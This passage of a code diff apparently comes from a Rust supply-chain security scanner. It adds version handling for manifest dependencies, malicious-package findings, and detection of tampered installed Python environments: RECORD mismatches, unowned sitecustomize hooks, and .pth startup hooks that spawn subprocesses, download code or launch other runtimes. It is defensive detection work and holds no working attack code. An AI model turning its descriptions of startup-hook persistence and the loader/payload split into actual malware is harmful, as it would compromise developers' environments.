@@ -23,8 +23,9 @@ use serde::Serialize;
 use crate::package_risk::{
     self, ApiSignals, ContentSignals, NameVsPopular, PackageSignals, RiskBreakdown,
 };
-use crate::threatdb::{Ecosystem, ThreatDb};
+use crate::threatdb::{Ecosystem, PackageThreatAssessment, ThreatDb};
 use crate::verdict::{Action, Evidence, Finding, RuleId, Severity, Timings, Verdict};
+use crate::version_intent::VersionIntent;
 
 /// Maximum directory depth the manifest walk descends.
 pub const MAX_WALK_DEPTH: usize = 6;
@@ -206,15 +207,43 @@ pub struct DeclaredDependency {
     /// The ecosystem the manifest is for.
     #[serde(serialize_with = "serialize_ecosystem")]
     pub ecosystem: Ecosystem,
-    /// The version / version-range string as written, when the manifest gives one.
-    #[serde(skip_serializing_if = "Option::is_none")]
-    pub version: Option<String>,
+    /// How the version / version-range was written, when the manifest gives one.
+    /// Serializes as the version string (or is omitted when unspecified), so the
+    /// JSON shape is unchanged from the prior `Option<String>` field; the typed
+    /// form lets the threat assessment tell an exact pin from a range.
+    #[serde(
+        serialize_with = "serialize_version_intent",
+        skip_serializing_if = "version_intent_is_unspecified"
+    )]
+    pub version: VersionIntent,
     /// Whether the manifest declares this as a development-only dependency.
     pub dev: bool,
 }
 
 fn serialize_ecosystem<S: serde::Serializer>(eco: &Ecosystem, s: S) -> Result<S::Ok, S::Error> {
     s.serialize_str(&eco.to_string())
+}
+
+/// Serialize a [`VersionIntent`] as the original version string, preserving the
+/// JSON shape of the former `version: Option<String>` field. `Unspecified` is
+/// skipped via [`version_intent_is_unspecified`], so this only runs for the
+/// other variants (which all have a string form).
+fn serialize_version_intent<S: serde::Serializer>(
+    intent: &VersionIntent,
+    s: S,
+) -> Result<S::Ok, S::Error> {
+    match intent.as_version_str() {
+        Some(v) => s.serialize_str(v),
+        // Unreachable in practice (Unspecified is skipped), but serialize a unit
+        // rather than panic if the skip predicate is ever bypassed.
+        None => s.serialize_none(),
+    }
+}
+
+/// Skip predicate matching the old `Option::is_none`: omit the field only when
+/// no version was given.
+fn version_intent_is_unspecified(intent: &VersionIntent) -> bool {
+    matches!(intent, VersionIntent::Unspecified)
 }
 
 /// Parse a manifest's text into the dependencies it declares. Total, never
@@ -251,10 +280,17 @@ fn parse_package_json(text: &str) -> Option<Vec<DeclaredDependency>> {
                 if name.is_empty() {
                     continue;
                 }
+                let version = match ver.as_str().filter(|s| !s.is_empty()) {
+                    // package.json declares a semver range/version (not parsed
+                    // for npm); a plain version is an exact pin, a range stays
+                    // unresolved.
+                    Some(v) => VersionIntent::from_explicit_version(v),
+                    None => VersionIntent::Unspecified,
+                };
                 out.push(DeclaredDependency {
                     name: name.to_string(),
                     ecosystem: Ecosystem::Npm,
-                    version: ver.as_str().map(str::to_string).filter(|s| !s.is_empty()),
+                    version,
                     dev,
                 });
             }
@@ -287,7 +323,8 @@ fn parse_package_lock(text: &str) -> Option<Vec<DeclaredDependency>> {
                 out.push(DeclaredDependency {
                     name,
                     ecosystem: Ecosystem::Npm,
-                    version,
+                    // A lockfile pins a concrete resolved version.
+                    version: lock_version_intent(version),
                     dev,
                 });
             }
@@ -300,6 +337,16 @@ fn parse_package_lock(text: &str) -> Option<Vec<DeclaredDependency>> {
     }
 
     Some(out)
+}
+
+/// Map a lockfile's resolved version string to a [`VersionIntent`]. A lockfile
+/// pins one concrete version, so a present value is `Resolved`; an absent one is
+/// `Unspecified`.
+fn lock_version_intent(version: Option<String>) -> VersionIntent {
+    match version {
+        Some(v) => VersionIntent::Resolved(v),
+        None => VersionIntent::Unspecified,
+    }
 }
 
 /// Extract the package name from a `package-lock.json` v2/v3 path key — the
@@ -339,7 +386,8 @@ fn collect_lock_v1_deps(
             out.push(DeclaredDependency {
                 name: name.to_string(),
                 ecosystem: Ecosystem::Npm,
-                version,
+                // A lockfile pins a concrete resolved version.
+                version: lock_version_intent(version),
                 dev,
             });
         }
@@ -376,7 +424,8 @@ fn parse_requirements_txt(text: &str) -> Vec<DeclaredDependency> {
             out.push(DeclaredDependency {
                 name,
                 ecosystem: Ecosystem::PyPI,
-                version: None,
+                // requirements.txt parsing keeps only the name today.
+                version: VersionIntent::Unspecified,
                 dev: false,
             });
         }
@@ -424,7 +473,8 @@ fn parse_pyproject_toml(text: &str) -> Option<Vec<DeclaredDependency>> {
             out.push(DeclaredDependency {
                 name: name.to_string(),
                 ecosystem: Ecosystem::PyPI,
-                version: None,
+                // pyproject parsing keeps only the name today.
+                version: VersionIntent::Unspecified,
                 dev,
             });
         }
@@ -534,7 +584,11 @@ fn parse_cargo_toml(text: &str) -> Option<Vec<DeclaredDependency>> {
                     out.push(DeclaredDependency {
                         name: real_name.to_string(),
                         ecosystem: Ecosystem::Crates,
-                        version,
+                        // Cargo semver requirement: not parsed; plain is exact,
+                        // a range stays unresolved.
+                        version: version
+                            .map(|v| VersionIntent::from_explicit_version(&v))
+                            .unwrap_or(VersionIntent::Unspecified),
                         dev,
                     });
                 }
@@ -613,7 +667,10 @@ fn go_mod_require_entry(entry: &str) -> Option<DeclaredDependency> {
     Some(DeclaredDependency {
         name: module.to_string(),
         ecosystem: Ecosystem::Go,
-        version,
+        // go.mod pins a concrete module version (e.g. `v1.2.3`).
+        version: version
+            .map(|v| VersionIntent::from_explicit_version(&v))
+            .unwrap_or(VersionIntent::Unspecified),
         dev: false,
     })
 }
@@ -655,7 +712,8 @@ fn parse_gemfile(text: &str) -> Vec<DeclaredDependency> {
                 out.push(DeclaredDependency {
                     name,
                     ecosystem: Ecosystem::RubyGems,
-                    version: None,
+                    // Gemfile parsing keeps only the name today.
+                    version: VersionIntent::Unspecified,
                     dev: block_stack.iter().any(|&is_dev| is_dev),
                 });
             }
@@ -978,9 +1036,62 @@ pub struct DependencyAssessment {
     pub risk: RiskBreakdown,
     /// The slopsquat heuristic verdict.
     pub slopsquat: SlopsquatAssessment,
+    /// The constraint-aware threat-DB assessment for this dependency's
+    /// `(ecosystem, name, version-intent)`. A serializable summary, never a
+    /// `ThreatMatch`. Omitted from JSON when there is no record so a clean
+    /// report gains no `"no_record"` noise.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub threat_assessment: Option<PackageThreatAssessment>,
     /// `true` when a policy allowlist entry suppressed this dependency's
     /// findings (the assessment is still reported, for transparency).
     pub allowlisted: bool,
+}
+
+/// Build the Medium/Warn finding for a dependency whose malicious-package
+/// version could not be resolved (an unpinned/range manifest entry over a
+/// version-specific record, or a constraint that overlaps the affected
+/// versions). Advises pinning to a known non-affected version.
+fn unresolved_dependency_finding(
+    dep: &DeclaredDependency,
+    manifest: &str,
+    summary: &crate::threatdb::ThreatMatchSummary,
+    affected_versions: &[String],
+) -> Finding {
+    let affected_list = if affected_versions.is_empty() {
+        "unknown".to_string()
+    } else {
+        affected_versions.join(", ")
+    };
+    let declared = dep
+        .version
+        .as_version_str()
+        .map(|v| format!("declared as '{v}'"))
+        .unwrap_or_else(|| "declared without a version".to_string());
+    Finding {
+        rule_id: RuleId::ThreatUnresolvedMaliciousPackage,
+        severity: Severity::Medium,
+        title: format!(
+            "Unresolved malicious {} dependency: {}",
+            dep.ecosystem, dep.name
+        ),
+        description: format!(
+            "The {} dependency '{}' {declared} in {} is flagged as malicious by {} for \
+             specific versions ({affected_list}), but the request could not be resolved to a \
+             definite version. Pin an exact non-affected version (or remove the dependency) to \
+             clear this warning.",
+            dep.ecosystem, dep.name, manifest, summary.source_label,
+        ),
+        evidence: vec![Evidence::ThreatIntel {
+            source: summary.source_label.clone(),
+            threat_type: "unresolved_malicious_package".to_string(),
+            confidence: summary.confidence,
+            reference: summary.reference_url.clone(),
+        }],
+        human_view: None,
+        agent_view: None,
+        mitre_id: None,
+        custom_rule_id: None,
+    }
 }
 
 /// Build the [`Finding`]s a single [`DependencyAssessment`] produces, reusing
@@ -998,6 +1109,69 @@ pub fn findings_for(
     let mut findings = Vec::new();
     let dep = &assessment.dependency;
     let manifest = &assessment.manifest;
+
+    // 0 — constraint-aware threat-DB assessment (A1e). An exact/all-versions
+    // hit dominates and stands alone (returns); an unresolved or intersecting
+    // constraint emits the Medium/Warn but falls through, since the name may
+    // ALSO be a typosquat or near-popular.
+    match &assessment.threat_assessment {
+        Some(PackageThreatAssessment::ExactMatch(summary)) => {
+            findings.push(Finding {
+                rule_id: RuleId::ThreatMaliciousPackage,
+                severity: crate::rules::threatintel::confidence_to_severity(summary.confidence),
+                title: format!("Known malicious {} dependency: {}", dep.ecosystem, dep.name),
+                description: format!(
+                    "The {} dependency '{}' declared in {} is flagged as malicious by {}. {}",
+                    dep.ecosystem,
+                    dep.name,
+                    manifest,
+                    summary.source_label,
+                    if summary.all_versions_malicious {
+                        "All versions are affected."
+                    } else {
+                        "Specific version(s) affected."
+                    }
+                ),
+                evidence: vec![Evidence::ThreatIntel {
+                    source: summary.source_label.clone(),
+                    threat_type: "malicious_package".to_string(),
+                    confidence: summary.confidence,
+                    reference: summary.reference_url.clone(),
+                }],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            });
+            return findings;
+        }
+        Some(PackageThreatAssessment::ConstraintIntersectsAffected {
+            summary,
+            affected_versions,
+        }) => {
+            findings.push(unresolved_dependency_finding(
+                dep,
+                manifest,
+                summary,
+                affected_versions,
+            ));
+        }
+        Some(PackageThreatAssessment::Unresolved {
+            summary,
+            affected_versions,
+            ..
+        }) => {
+            findings.push(unresolved_dependency_finding(
+                dep,
+                manifest,
+                summary,
+                affected_versions,
+            ));
+        }
+        Some(PackageThreatAssessment::ConstraintExcludesAffected)
+        | Some(PackageThreatAssessment::NoRecord)
+        | None => {}
+    }
 
     // 1 — confirmed malicious typosquat from the threat DB; stands alone.
     if let Some(target) = &assessment.risk.malicious_typosquat_of {
@@ -1467,6 +1641,12 @@ pub struct EcosystemScanReport {
     pub online: bool,
     /// Notes about coverage — unreadable manifests, truncation, missing DB.
     pub notes: Vec<ScanNote>,
+    /// B5: installed-distribution integrity, in `--installed` mode only. Carries
+    /// the per-distribution RECORD verification and the cross-distribution
+    /// ownership findings. `skip_serializing_if = Option::is_none` so the
+    /// manifest/lockfile modes (which never compute it) keep byte-identical JSON.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub integrity: Option<InstalledIntegrityReport>,
     /// The verdict: every finding from every non-allowlisted dependency.
     pub verdict: Verdict,
 }
@@ -1638,8 +1818,38 @@ pub fn scan(request: &ScanRequest) -> EcosystemScanReport {
             findings.extend(policy_findings_for_assessment(assessment, effective_policy));
         }
     }
-    // tier_reached is 3 — `ecosystem scan` does the full analysis.
-    let verdict = Verdict::from_findings(findings, 3, Timings::default());
+
+    // B5 installed-distribution integrity: only in `--installed` mode (the
+    // manifest/lockfile modes do not have a real installed tree to verify). The
+    // pass builds the ownership index once per site-packages root, runs the lax
+    // installed-RECORD verifier per distribution, scans the site root for startup
+    // hooks, and correlates the granular signals into one
+    // `PythonInstalledIntegrityViolation` finding folded into the same verdict.
+    let integrity = if matches!(request.mode, ScanMode::Installed) {
+        let report = collect_installed_integrity(request.root);
+        findings.extend(report.correlated_findings(effective_policy));
+        // B6: the startup-hook execution correlation (the two startup findings)
+        // runs over the same report's startup signals, folded into the same
+        // verdict so policy overrides apply uniformly.
+        findings.extend(report.startup_correlated_findings());
+        // B7: the native import-execution-chain findings (built per native module
+        // during the walk) fold into the same verdict, so their Critical action and
+        // any policy overrides apply uniformly with the B5/B6 findings.
+        findings.extend(report.native_correlated_findings());
+        Some(report)
+    } else {
+        None
+    };
+
+    // tier_reached is 3 — `ecosystem scan` does the full analysis. Assemble via
+    // the shared finalizer so policy `action_overrides` (and severity overrides
+    // and paranoia) are honored here, not only on the engine hot path.
+    let verdict = crate::escalation::finalize_static_verdict(
+        findings,
+        effective_policy,
+        3,
+        Timings::default(),
+    );
 
     EcosystemScanReport {
         scan_root: root_display,
@@ -1648,6 +1858,7 @@ pub fn scan(request: &ScanRequest) -> EcosystemScanReport {
         assessments,
         online,
         notes,
+        integrity,
         verdict,
         mode: request.mode.as_str(),
     }
@@ -1973,7 +2184,8 @@ fn read_node_package(
         DeclaredDependency {
             name: name.to_string(),
             ecosystem: Ecosystem::Npm,
-            version,
+            // An installed package reports its own concrete version.
+            version: lock_version_intent(version),
             dev: false,
         },
         label,
@@ -2064,7 +2276,8 @@ fn walk_site_packages(
             DeclaredDependency {
                 name,
                 ecosystem: Ecosystem::PyPI,
-                version,
+                // An installed distribution reports its own concrete version.
+                version: lock_version_intent(version),
                 dev: false,
             },
             label,
@@ -2072,29 +2285,836 @@ fn walk_site_packages(
     }
 }
 
-/// Parse a PEP 566 METADATA file's `Name:` and `Version:` headers.
+/// Parse a PEP 566 METADATA file's `Name:` and `Version:` headers, reusing the
+/// shared header loop in [`crate::artifact::wheel::parse_metadata_headers`] so the
+/// installed-tree scan and the artifact parsers cannot drift on what a
+/// name/version is. The extra `is_plausible_package_name` gate is specific to the
+/// scan (it filters a junk `Name:` out of the dependency list); a name that fails
+/// it is dropped here, yielding `None`.
 fn read_dist_info_metadata(path: &Path) -> Option<(String, Option<String>)> {
     let text = std::fs::read_to_string(path).ok()?;
-    let mut name: Option<String> = None;
-    let mut version: Option<String> = None;
-    // Headers stop at the first blank line; the body is unneeded description.
-    for line in text.lines() {
-        if line.is_empty() {
+    let (name, version) = crate::artifact::wheel::parse_metadata_headers(&text)?;
+    if !is_plausible_package_name(&name) {
+        return None;
+    }
+    Some((name, version))
+}
+
+// ---------------------------------------------------------------------------
+// B5 installed-distribution integrity
+// ---------------------------------------------------------------------------
+
+/// One normalized installed path owned by two or more distributions, for the
+/// serialized report. The cross-distribution loader/payload split surfaces as a
+/// duplicate-ownership here.
+#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
+pub struct DuplicateOwnership {
+    /// The normalized installed path both distributions claim.
+    pub path: String,
+    /// The names of the distributions that both list `path` in their RECORD.
+    pub owners: Vec<String>,
+}
+
+/// B5 installed-distribution integrity over one or more `site-packages` roots.
+/// Carries the per-root coverage and the granular integrity signals; the
+/// correlation into the single user-facing
+/// [`RuleId::PythonInstalledIntegrityViolation`] finding is
+/// [`InstalledIntegrityReport::correlated_findings`]. Serialized onto
+/// [`EcosystemScanReport`] only in `--installed` mode.
+#[derive(Debug, Clone, Default, Serialize)]
+pub struct InstalledIntegrityReport {
+    /// The `site-packages` roots that were scanned (root-relative-ish display
+    /// strings).
+    pub site_packages_roots: Vec<String>,
+    /// How many installed distributions had their RECORD verified.
+    pub distributions_checked: usize,
+    /// How many distributions had NO RECORD (a coverage gap, not a violation).
+    pub records_missing: usize,
+    /// How many RECORD-listed files did not match their on-disk bytes.
+    pub hash_mismatches: usize,
+    /// Paths owned by more than one distribution (the duplicate-ownership / cross-
+    /// distribution split).
+    pub duplicate_owned_paths: Vec<DuplicateOwnership>,
+    /// `sitecustomize.py`/`usercustomize.py` files present at a site root but
+    /// owned by no installed distribution's RECORD (an unowned startup hook: the
+    /// strongest B5 corroborator).
+    pub unowned_startup_hooks: Vec<String>,
+    /// Startup-execution inventory present at a site root (`.pth`/`.start`/
+    /// `.egg-link`). INVENTORY only in B5: these are recorded for the B6 startup
+    /// analyzer and are NOT a standalone finding here.
+    pub startup_inventory: Vec<String>,
+    /// Every granular signal collected (RECORD mismatch, duplicate-owned,
+    /// sitecustomize-unowned), the evidence the correlation lists.
+    pub signals: Vec<crate::artifact::ArtifactSignal>,
+    /// B6: the granular startup-hook EXECUTION signals collected while reading the
+    /// inventoried `.pth`/`.start`/`sitecustomize.py`/`usercustomize.py` bodies (an
+    /// executing non-template line, a subprocess spawn, a network download, a
+    /// `sys.path` search, obfuscated content, or an untrusted path addition).
+    /// Correlated into the two startup-hook findings, kept separate from the B5
+    /// integrity `signals` so the two correlations do not interfere.
+    pub startup_signals: Vec<crate::artifact::ArtifactSignal>,
+    /// B6: the execution edges discovered from startup hooks (a hook imports a
+    /// module / launches a runtime). Carried for the JSON report and the
+    /// cross-runtime correlation.
+    pub startup_execution_edges: Vec<crate::artifact::ExecutionEdge>,
+    /// B6: `true` when at least one inventoried startup hook launches a different
+    /// language runtime (Bun/Node/Deno) at interpreter start, the Critical
+    /// cross-runtime case.
+    pub startup_cross_runtime: bool,
+    /// B7: how many native modules (`.so`/`.pyd`/`.dylib`/`.node`) under the
+    /// site-packages roots were triaged.
+    pub native_modules_triaged: usize,
+    /// B7: the granular native-triage signals collected (native-module presence, a
+    /// native execution entry, a danger capability, corroboration). Correlated into
+    /// the `NativeImportExecutionChain` findings, kept separate from the B5/B6
+    /// signal sets so the three correlations do not interfere.
+    pub native_signals: Vec<crate::artifact::ArtifactSignal>,
+    /// B7: the execution edges discovered from native modules (a module's init
+    /// triggers a sibling payload / launches a runtime). Carried for the JSON report.
+    pub native_execution_edges: Vec<crate::artifact::ExecutionEdge>,
+    /// B7: the correlated native findings (each a Critical
+    /// `NativeImportExecutionChain`). Built during the native walk because the
+    /// per-module conjunction is decided per member; folded into the verdict by
+    /// [`InstalledIntegrityReport::native_correlated_findings`].
+    #[serde(skip)]
+    pub native_findings: Vec<Finding>,
+}
+
+impl InstalledIntegrityReport {
+    /// Whether any integrity SIGNAL was recorded (a missing RECORD on its own is
+    /// not a signal: it is a coverage gap counted in `records_missing`).
+    fn has_signal(&self) -> bool {
+        !self.signals.is_empty()
+    }
+
+    /// Correlate the granular signals into AT MOST ONE user-facing
+    /// [`RuleId::PythonInstalledIntegrityViolation`] finding (cross-cutting
+    /// invariant 1: few user-facing findings, detail carried as signals). Returns
+    /// an empty vec when there is no signal.
+    ///
+    /// Severity is Medium by default (installed-environment drift is common). It
+    /// rises to High ONLY with corroboration B5 can establish: an UNOWNED startup
+    /// hook (`sitecustomize.py`/`usercustomize.py` owned by no distribution),
+    /// which the plan lists as a High corroborator. A strict integrity policy
+    /// further upgrades the ACTION to Block via `action_overrides`, applied by
+    /// `finalize_static_verdict`; this function does not itself force Block.
+    fn correlated_findings(&self, _policy: &crate::policy::Policy) -> Vec<Finding> {
+        if !self.has_signal() {
+            return Vec::new();
+        }
+
+        // Corroboration: an unowned startup hook elevates the default Medium to
+        // High (a hook that executes at every interpreter start and belongs to no
+        // package is the serious case; a bare RECORD mismatch in a possibly
+        // conda/distro/editable tree is not, by itself).
+        let corroborated = !self.unowned_startup_hooks.is_empty();
+        let severity = if corroborated {
+            Severity::High
+        } else {
+            Severity::Medium
+        };
+
+        // Build a compact evidence list from the distinct signal kinds, plus the
+        // concrete offending items, so the single finding names what it correlated.
+        let mut evidence: Vec<Evidence> = Vec::new();
+        let kinds = self.distinct_signal_kinds();
+        evidence.push(Evidence::Text {
+            detail: format!("correlated integrity signals: {}", kinds.join(", ")),
+        });
+        for hook in &self.unowned_startup_hooks {
+            evidence.push(Evidence::Text {
+                detail: format!("unowned startup hook: {hook}"),
+            });
+        }
+        for dup in &self.duplicate_owned_paths {
+            evidence.push(Evidence::Text {
+                detail: format!(
+                    "path '{}' owned by multiple distributions: {}",
+                    dup.path,
+                    dup.owners.join(", ")
+                ),
+            });
+        }
+        if self.hash_mismatches > 0 {
+            evidence.push(Evidence::Text {
+                detail: format!(
+                    "{} RECORD hash mismatch(es) against on-disk bytes",
+                    self.hash_mismatches
+                ),
+            });
+        }
+
+        let title = if corroborated {
+            "Installed Python environment integrity violation (unowned startup hook)".to_string()
+        } else {
+            "Installed Python environment integrity violation".to_string()
+        };
+        let description = format!(
+            "The installed environment failed an integrity check: {}. Installed-environment \
+             drift is common (conda, distro packaging, build instrumentation, editable \
+             installs), so this is Medium by default and only rises with corroboration such \
+             as an unowned startup hook. Review the named files and reinstall affected \
+             distributions from a trusted source; set a strict integrity policy \
+             (action_overrides) to block on this.",
+            kinds.join(", ")
+        );
+
+        vec![Finding {
+            rule_id: RuleId::PythonInstalledIntegrityViolation,
+            severity,
+            title,
+            description,
+            evidence,
+            human_view: None,
+            agent_view: None,
+            mitre_id: None,
+            custom_rule_id: None,
+        }]
+    }
+
+    /// The distinct signal-kind wire strings present, sorted, for the evidence
+    /// summary.
+    fn distinct_signal_kinds(&self) -> Vec<String> {
+        let mut kinds: BTreeSet<String> = BTreeSet::new();
+        for s in &self.signals {
+            // The signal kind serializes to its snake_case name.
+            if let Ok(serde_json::Value::String(k)) = serde_json::to_value(s.kind) {
+                kinds.insert(k);
+            }
+        }
+        kinds.into_iter().collect()
+    }
+
+    /// B6: correlate the granular startup-hook signals into AT MOST ONE
+    /// [`RuleId::PythonStartupHookSuspicious`] (High) AND/OR AT MOST ONE
+    /// [`RuleId::PythonStartupHookCrossRuntime`] (Critical) finding (cross-cutting
+    /// invariant 1). Returns an empty vec when no startup signal was recorded.
+    ///
+    /// Suspicious (High -> Block) requires an EXECUTING, non-template hook line
+    /// (`PthExecutableLine`) paired with a danger capability or untrusted path:
+    /// a subprocess spawn, a network download, a `sys.path` search, obfuscated
+    /// content, or an untrusted path addition. A bare path addition with no
+    /// executing line is reported in the JSON inventory but is not, on its own,
+    /// promoted to a Block here (it is a lower-confidence signal).
+    ///
+    /// Cross-runtime (Critical -> Block) fires when a startup hook launches a
+    /// different language runtime (Bun/Node/Deno), keyed on the launched RUNTIME
+    /// name, not the payload filename, so a rename does not evade.
+    fn startup_correlated_findings(&self) -> Vec<Finding> {
+        if self.startup_signals.is_empty() {
+            return Vec::new();
+        }
+
+        let mut findings: Vec<Finding> = Vec::new();
+        let kinds: BTreeSet<crate::artifact::ArtifactSignalKind> =
+            self.startup_signals.iter().map(|s| s.kind).collect();
+        use crate::artifact::ArtifactSignalKind as K;
+
+        // A startup hook must actually EXECUTE for the suspicious finding: a
+        // `PthExecutableLine` (or a malformed import-prefixed line) is the proof of
+        // execution. A `PthUntrustedPathAddition` alone (a non-executing path-add)
+        // is recorded but does not by itself promote to Block.
+        let has_executing_line = kinds.contains(&K::PthExecutableLine);
+        // Danger is the SINGLE definition in `BodyCapabilities::has_danger()`
+        // (subprocess / network / dynamic-code / cross-runtime). Reconstruct the
+        // capabilities the recorded signal kinds imply and ask that one method, so
+        // this correlation cannot drift from the analyzer's definition (T3.16/T2.11).
+        // `sys.path` manipulation (`PthSysPathSearch`) and an untrusted path
+        // addition (`PthUntrustedPathAddition`) are EVIDENCE only: they stay in the
+        // signal stream but do not, on their own, satisfy the danger precondition,
+        // so a legitimate `sitecustomize` doing `sys.path.insert(...)` is not
+        // promoted to Block. (Cross-runtime is handled by its own Critical path
+        // below; dynamic-code has no standalone signal kind in this correlation.)
+        let body_caps = crate::artifact::pth::BodyCapabilities {
+            subprocess: kinds.contains(&K::PthSubprocessSpawn),
+            network: kinds.contains(&K::PthNetworkDownload),
+            sys_path_search: kinds.contains(&K::PthSysPathSearch),
+            obfuscated: kinds.contains(&K::StartupHookObfuscated),
+            ..Default::default()
+        };
+        let has_danger = body_caps.has_danger();
+
+        if has_executing_line && has_danger {
+            let kind_list = startup_distinct_kind_strings(&self.startup_signals);
+            let mut evidence: Vec<Evidence> = Vec::new();
+            evidence.push(Evidence::Text {
+                detail: format!("correlated startup-hook signals: {}", kind_list.join(", ")),
+            });
+            // List the concrete offending lines (the executable-line + untrusted
+            // path-add signals carry the offending text in their evidence).
+            for s in &self.startup_signals {
+                if matches!(s.kind, K::PthExecutableLine | K::PthUntrustedPathAddition) {
+                    evidence.push(Evidence::Text {
+                        detail: s.evidence.clone(),
+                    });
+                }
+            }
+            findings.push(Finding {
+                rule_id: RuleId::PythonStartupHookSuspicious,
+                severity: Severity::High,
+                title: "A Python startup hook executes suspicious code at interpreter start"
+                    .to_string(),
+                description: "An installed startup hook (a .pth import line, a Python 3.15 .start \
+                     entry-point file, or a sitecustomize.py/usercustomize.py) executes \
+                     suspicious code at every interpreter start. The body pairs an executing, \
+                     non-template line with a danger capability (a subprocess spawn, a network \
+                     download, a sys.path search, obfuscated content, or an untrusted path \
+                     addition). Canonical editable-install and namespace-package bootstraps are \
+                     exempt because their complete line matches a known template. Review the named \
+                     hook and reinstall its owning distribution from a trusted source."
+                    .to_string(),
+                evidence,
+                human_view: None,
+                agent_view: None,
+                mitre_id: Some("T1546".to_string()),
+                custom_rule_id: None,
+            });
+        }
+
+        // Cross-runtime: keyed on the recorded flag (set when a hook launches a
+        // foreign runtime). This is the Critical case and is independent of the
+        // suspicious finding (both can fire; the action is Block either way).
+        if self.startup_cross_runtime {
+            let mut evidence: Vec<Evidence> = Vec::new();
+            evidence.push(Evidence::Text {
+                detail: "a startup hook launches a different language runtime \
+                         (Bun/Node/Deno) at interpreter start"
+                    .to_string(),
+            });
+            for edge in &self.startup_execution_edges {
+                if matches!(
+                    edge.trigger,
+                    crate::artifact::ExecutionTrigger::CrossRuntimeInvocation
+                ) {
+                    evidence.push(Evidence::Text {
+                        detail: format!("{} -> {} ({})", edge.from, edge.to, edge.mechanism),
+                    });
+                }
+            }
+            findings.push(Finding {
+                rule_id: RuleId::PythonStartupHookCrossRuntime,
+                severity: Severity::Critical,
+                title: "A Python startup hook launches a different language runtime".to_string(),
+                description:
+                    "An installed Python startup hook launches a separate language runtime \
+                     (Bun, Node, or Deno) at interpreter start. This is the cross-distribution \
+                     loader/payload split used by the live supply-chain campaign, where a Python \
+                     .pth hands execution to a bundled JavaScript payload. The detection keys on \
+                     the launched runtime name, not the payload filename, so renaming the script \
+                     does not evade it. Treat this as an incident: isolate the environment, rotate \
+                     reachable credentials, and reinstall affected distributions from a trusted \
+                     source after confirming the upstream artifact is clean."
+                        .to_string(),
+                evidence,
+                human_view: None,
+                agent_view: None,
+                mitre_id: Some("T1546".to_string()),
+                custom_rule_id: None,
+            });
+        }
+
+        findings
+    }
+
+    /// B7: the correlated native findings (each a Critical
+    /// `RuleId::NativeImportExecutionChain`). Built during the native walk because
+    /// the per-module conjunction (execution entry AND danger capability AND
+    /// corroboration) is decided per member; this returns them to fold into the
+    /// verdict. Returns a clone so the report keeps its own copy for the JSON view.
+    fn native_correlated_findings(&self) -> Vec<Finding> {
+        self.native_findings.clone()
+    }
+}
+
+/// The distinct startup-signal-kind wire strings present, sorted, for evidence.
+fn startup_distinct_kind_strings(signals: &[crate::artifact::ArtifactSignal]) -> Vec<String> {
+    let mut kinds: BTreeSet<String> = BTreeSet::new();
+    for s in signals {
+        if let Ok(serde_json::Value::String(k)) = serde_json::to_value(s.kind) {
+            kinds.insert(k);
+        }
+    }
+    kinds.into_iter().collect()
+}
+
+/// Run the B5 installed-integrity pass over every `site-packages` root under
+/// `root`. For each root it builds a duplicate-aware ownership index across all
+/// distributions, verifies each distribution's RECORD leniently, and scans the
+/// root for unowned `sitecustomize.py`/`usercustomize.py` startup hooks (plus
+/// inventories `.pth`/`.start`/`.egg-link` for the later B6 analyzer). Never
+/// follows a symlinked final component when reading a file. Best-effort: an
+/// unreadable directory contributes nothing rather than failing the scan.
+fn collect_installed_integrity(root: &Path) -> InstalledIntegrityReport {
+    use crate::artifact::record::{
+        index_distribution_ownership, verify_installed_record, EnvironmentLayout, FileVerification,
+        OwnershipIndex,
+    };
+    use crate::artifact::{ArtifactSignal, ArtifactSignalKind, EdgeConfidence};
+    use crate::location::SubjectLocation;
+
+    let mut report = InstalledIntegrityReport::default();
+
+    for site in find_site_packages_dirs(root) {
+        report.site_packages_roots.push(site.display().to_string());
+        let layout = EnvironmentLayout::for_site_packages(site.clone());
+
+        // Discover every `.dist-info` in this root and its distribution identity.
+        let dist_infos = discover_dist_infos(&site);
+
+        // 1. Ownership index across ALL distributions in this root (duplicate
+        //    ownership is what we detect, so it must be cross-distribution).
+        let mut index = OwnershipIndex::new();
+        for (dist_info, identity) in &dist_infos {
+            index_distribution_ownership(dist_info, identity, &mut index);
+        }
+
+        // 2. Per-distribution lenient RECORD verification.
+        for (dist_info, identity) in &dist_infos {
+            let result = verify_installed_record(dist_info, &layout, identity, false);
+            report.distributions_checked += 1;
+            if result.record_missing {
+                report.records_missing += 1;
+            }
+            for entry in &result.entries {
+                if matches!(entry.verification, FileVerification::Mismatch { .. }) {
+                    report.hash_mismatches += 1;
+                }
+            }
+            report.signals.extend(result.signals);
+        }
+
+        // 3. Duplicate-owned paths -> a signal each.
+        for (path, owners) in index.duplicates() {
+            let owner_names: Vec<String> = owners.iter().map(|d| d.name.clone()).collect();
+            report.duplicate_owned_paths.push(DuplicateOwnership {
+                path: path.as_str().to_string(),
+                owners: owner_names.clone(),
+            });
+            report.signals.push(ArtifactSignal {
+                kind: ArtifactSignalKind::DuplicateOwnedFile,
+                location: SubjectLocation::installed(site.join(path.as_str())),
+                evidence: format!(
+                    "installed path '{}' is owned by multiple distributions: {}",
+                    path,
+                    owner_names.join(", ")
+                ),
+                confidence: EdgeConfidence::Medium,
+            });
+        }
+
+        // 4. Scan the site root for startup hooks. `sitecustomize.py` /
+        //    `usercustomize.py` owned by NO distribution is a corroborating
+        //    signal; `.pth`/`.start`/`.egg-link` are INVENTORY (for B6), not a
+        //    finding here.
+        scan_site_root_startup(&site, &index, &mut report);
+
+        // 5. B7: walk the site root (bounded) for native modules and triage each.
+        //    The per-member conjunction (execution entry AND danger capability AND
+        //    corroboration) decides whether a Critical NativeImportExecutionChain
+        //    finding is produced; an UNOWNED native module strengthens it.
+        scan_native_modules(&site, &index, &mut report);
+    }
+
+    report
+}
+
+/// Maximum native-module body size triaged. A member at or under this is read
+/// whole (no-follow) and parsed in full by B7; a larger one is skipped here (the
+/// installed walk does not stream above-cap members — that streaming path is
+/// exercised through the archive reader's handoff). 64 MiB matches the archive
+/// reader's native-parse cap so the two paths agree.
+const MAX_NATIVE_MODULE_BYTES: u64 = 64 * 1024 * 1024;
+
+/// Maximum native modules triaged per site-packages root, so a pathological tree
+/// with thousands of `.so` files cannot dominate the scan.
+const MAX_NATIVE_MODULES_PER_SITE: usize = 4096;
+
+/// Maximum directory depth descended under a site-packages root when collecting
